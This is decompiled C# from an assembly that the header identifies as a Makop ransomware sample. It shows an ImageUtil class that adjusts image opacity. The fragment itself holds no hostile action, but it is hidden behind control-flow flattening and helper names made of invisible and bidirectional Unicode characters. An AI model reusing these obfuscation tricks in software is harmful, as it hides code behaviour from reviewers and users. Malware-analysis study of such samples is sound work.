// Decompiled with JetBrains decompiler
// Type: ImageUtil
// Assembly: Gز, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19F72CF4-8E17-4C69-9694-AAB2F68A841C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-315cc7a49fb61eb58200e4b8294fb4a7c58ef16bdf813f48fa8d114a9804258a.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

public static class ImageUtil
{
  private const int bytesPerPixel = 4;

  public static Image Opacity(Image originalImage, double opacity)
  {
    bool flag1 = (ImageUtil.\u202E‌‎‏​⁮⁮‮‌⁬⁮‪‌⁫‫⁫⁬⁬‮⁫⁮⁯‎‎⁮‫‮‍⁫‮‏⁭‭‎‮‫⁯‎‭‮‮(originalImage) & PixelFormat.Indexed) == PixelFormat.Indexed;
label_1:
    int num1 = 1446103813;
    int num2;
    Image image;
    int num3;
    byte[] numArray;
    Bitmap bitmap;
    BitmapData bitmapData;
    Rectangle rectangle;
    PixelFormat pixelFormat;
    IntPtr num4;
    int length;
    bool flag2;
    while (true)
    {
      uint num5;
      switch ((num5 = (uint) (num1 ^ 89955278)) % 26U)
      {
        case 0:
          num3 += 4;
          num1 = 587089229;
          continue;
        case 1:
          int num6 = flag2 ? -327035018 : (num6 = -645461867);
          num1 = num6 ^ (int) num5 * 1695557010;
          continue;
        case 2:
          bitmap = (Bitmap) ImageUtil.\u206B‪‎‍‎‬‍‌⁬⁪⁫‌‫⁪‪⁫‮‫⁮⁭⁯‌‪‮‪⁪⁭⁬⁮‭⁪‬‍‮‏‪‍⁫‭‬‮(originalImage);
          num1 = 5320067;
          continue;
        case 3:
          num1 = 2031461213;
          continue;
        case 4:
          ++num2;
          num1 = (int) num5 * 1387257275 ^ 1466577645;
          continue;
        case 5:
          image = (Image) bitmap;
          num1 = (int) num5 * 1551990718 ^ 942536882;
          continue;
        case 6:
          num1 = (int) num5 * 79769139 ^ 996384706;
          continue;
        case 7:
          int num7 = !flag1 ? 688092705 : (num7 = 1890494161);
          num1 = num7 ^ (int) num5 * 990346897;
          continue;
        case 8:
          num1 = (int) num5 * -860174292 ^ -719387572;
          continue;
        case 9:
          ImageUtil.\u200D⁭‎‪‌​‮‬‌‬‭‏‍‫‍⁪‌⁭‭‏‌‏‬⁯‭⁪‮‪‏‭‭‪‭‫​⁬⁭‫‍‏‮(bitmap, bitmapData);
          num1 = (int) num5 * 217188456 ^ -458100161;
          continue;
        case 10:
          num2 = num2 + 1 + 1;
          num1 = (int) num5 * -1733095065 ^ 250533794;
          continue;
        case 11:
          goto label_1;
        case 12:
          num3 = 0;
          num1 = (int) num5 * -964387167 ^ -1211455020;
          continue;
        case 13:
          numArray[num3 + num2] = (byte) ((double) numArray[num3 + num2] * opacity);
          num1 = (int) num5 * 24968456 ^ -1752548946;
          continue;
        case 14:
          num1 = (int) num5 * -1242927284 ^ -610814803;
          continue;
        case 15:
          int num8;
          num1 = num8 = num3 < numArray.Length ? 499751607 : (num8 = 1946762557);
          continue;
        case 17:
          pixelFormat = PixelFormat.Format32bppArgb;
          rectangle = new Rectangle(0, 0, ImageUtil.\u206F‌‍‏‪​‫‍⁪⁯​‪⁬⁭​‪⁫​⁯‏‪‪‭‫‫‎⁭‬​‫⁭⁭⁮⁮⁫‍⁫‏‭‪‮((Image) bitmap), ImageUtil.\u202A⁬⁭⁫​⁮⁭‍‍​‌​⁭‎‭‪‌⁮‪‍⁪‍‭‮‫‮⁪⁪‌⁬‎‍‭⁭‌‎‪⁫‍⁫‮((Image) bitmap));
          num1 = (int) num5 * 1357334960 ^ -1018773230;
          continue;
        case 18:
          bitmapData = ImageUtil.\u202C‫‭‎‭⁯​⁪⁪‭‍⁭‬‬⁯‪‮‫⁬‍⁯​​‏⁪⁮⁬‏⁭⁫‍‬‌‮⁫⁬​⁪⁮‬‮(bitmap, rectangle, ImageLockMode.ReadWrite, pixelFormat);
          num4 = ImageUtil.\u200C‫⁭‬⁯⁪⁬⁮⁯‍‪‏‫⁬⁪⁯‍‫⁯‫⁯‏​⁭‬‌⁮‬⁯⁮⁬⁭‮⁪⁫‫⁬⁭‍⁭‮(bitmapData);
          length = ImageUtil.\u206F‌‍‏‪​‫‍⁪⁯​‪⁬⁭​‪⁫​⁯‏‪‪‭‫‫‎⁭‬​‫⁭⁭⁮⁮⁫‍⁫‏‭‪‮((Image) bitmap) * ImageUtil.\u202A⁬⁭⁫​⁮⁭‍‍​‌​⁭‎‭‪‌⁮‪‍⁪‍‭‮‫‮⁪⁪‌⁬‎‍‭⁭‌‎‪⁫‍⁫‮((Image) bitmap) * 4;
          numArray = new byte[length];
          ImageUtil.\u206B‌‫⁬⁭⁯‎⁯‎‍⁬‫‏​⁬‫‏‬‏‮‪⁪⁬​⁫⁬‭‎⁬‭‍⁭⁭​⁬‍​⁪⁭‌‮(num4, numArray, 0, length);
          num1 = (int) num5 * -2067845777 ^ -706609496;
          continue;
        case 19:
          flag2 = numArray[num3 + 4 - 1] == (byte) 0;
          num1 = (int) num5 * -813543223 ^ 861305140;
          continue;
        case 20:
          num1 = (int) num5 * -1122818354 ^ 1618761404;
          continue;
        case 21:
          num1 = (int) num5 * -794695912 ^ -363398957;
          continue;
        case 22:
          image = originalImage;
          num1 = (int) num5 * -668194764 ^ -760618396;
          continue;
        case 23:
          num2 = 0;
          num1 = 2010208144;
          continue;
        case 24:
          num1 = (int) num5 * -875651924 ^ 12603412;
          continue;
        case 25:
          ImageUtil.\u202C‭‍‪​‍⁪‬‌⁯‏‎⁯⁪⁮‫​‮⁬‫‍‪‏​⁪⁯‬⁬⁯‪‭⁮‎⁯⁭⁮‬‮‭⁮‮(numArray, 0, num4, length);
          num1 = (int) num5 * -1630251347 ^ -1934130232;
          continue;
        default:
          goto label_27;
      }
    }
label_27:
    return image;
  }

  static PixelFormat \u202E‌‎‏​⁮⁮‮‌⁬⁮‪‌⁫‫⁫⁬⁬‮⁫⁮⁯‎‎⁮‫‮‍⁫‮‏⁭‭‎‮‫⁯‎‭‮‮([In] Image obj0) => obj0.PixelFormat;

  static object \u206B‪‎‍‎‬‍‌⁬⁪⁫‌‫⁪‪⁫‮‫⁮⁭⁯‌‪‮‪⁪⁭⁬⁮‭⁪‬‍‮‏‪‍⁫‭‬‮([In] Image obj0) => obj0.Clone();

  static int \u206F‌‍‏‪​‫‍⁪⁯​‪⁬⁭​‪⁫​⁯‏‪‪‭‫‫‎⁭‬​‫⁭⁭⁮⁮⁫‍⁫‏‭‪‮([In] Image obj0) => obj0.Width;

  static int \u202A⁬⁭⁫​⁮⁭‍‍​‌​⁭‎‭‪‌⁮‪‍⁪‍‭‮‫‮⁪⁪‌⁬‎‍‭⁭‌‎‪⁫‍⁫‮([In] Image obj0) => obj0.Height;

  static BitmapData \u202C‫‭‎‭⁯​⁪⁪‭‍⁭‬‬⁯‪‮‫⁬‍⁯​​‏⁪⁮⁬‏⁭⁫‍‬‌‮⁫⁬​⁪⁮‬‮(
    [In] Bitmap obj0,
    [In] Rectangle obj1,
    [In] ImageLockMode obj2,
    [In] PixelFormat obj3)
  {
    return obj0.LockBits(obj1, obj2, obj3);
  }

  static IntPtr \u200C‫⁭‬⁯⁪⁬⁮⁯‍‪‏‫⁬⁪⁯‍‫⁯‫⁯‏​⁭‬‌⁮‬⁯⁮⁬⁭‮⁪⁫‫⁬⁭‍⁭‮([In] BitmapData obj0) => obj0.Scan0;

  static void \u206B‌‫⁬⁭⁯‎⁯‎‍⁬‫‏​⁬‫‏‬‏‮‪⁪⁬​⁫⁬‭‎⁬‭‍⁭⁭​⁬‍​⁪⁭‌‮(
    [In] IntPtr obj0,
    [In] byte[] obj1,
    [In] int obj2,
    [In] int obj3)
  {
    Marshal.Copy(obj0, obj1, obj2, obj3);
  }

  static void \u202C‭‍‪​‍⁪‬‌⁯‏‎⁯⁪⁮‫​‮⁬‫‍‪‏​⁪⁯‬⁬⁯‪‭⁮‎⁯⁭⁮‬‮‭⁮‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    Marshal.Copy(obj0, obj1, obj2, obj3);
  }

  static void \u200D⁭‎‪‌​‮‬‌‬‭‏‍‫‍⁪‌⁭‭‏‌‏‬⁯‭⁪‮‪‏‭‭‪‭‫​⁬⁭‫‍‏‮([In] Bitmap obj0, [In] BitmapData obj1) => obj0.UnlockBits(obj1);
}
